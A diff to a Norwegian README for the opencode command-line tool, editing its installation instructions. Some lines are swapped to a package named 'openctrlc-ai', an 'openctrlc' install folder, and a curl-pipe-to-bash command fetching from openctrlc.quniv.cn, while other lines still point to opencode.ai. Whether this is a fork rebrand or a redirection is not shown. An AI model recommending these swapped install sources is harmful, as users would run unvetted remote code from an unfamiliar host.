@@ -50,7 +50,7 @@
 curl -fsSL https://opencode.ai/install | bash
 
 # Pakkehåndterere
-npm i -g opencode-ai@latest        # eller bun/pnpm/yarn
+npm i -g openctrlc-ai@latest       # eller bun/pnpm/yarn
 scoop install opencode             # Windows
 choco install opencode             # Windows
 brew install anomalyco/tap/opencode # macOS og Linux (anbefalt, alltid oppdatert)
@@ -89,11 +89,11 @@ Installasjonsskriptet bruker følgende prioritet for installasjonsstien:
 1. `$OPENCODE_INSTALL_DIR` - Egendefinert installasjonsmappe
 2. `$XDG_BIN_DIR` - Sti som følger XDG Base Directory Specification
 3. `$HOME/bin` - Standard brukerbinar-mappe (hvis den finnes eller kan opprettes)
-4. `$HOME/.opencode/bin` - Standard fallback
+4. `$HOME/.openctrlc/bin` - Standard fallback
 
 ```bash
 # Eksempler
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCTRLC_INSTALL_DIR=/usr/local/bin curl -fsSL https://openctrlc.quniv.cn/install | bash
 XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
 ```
 
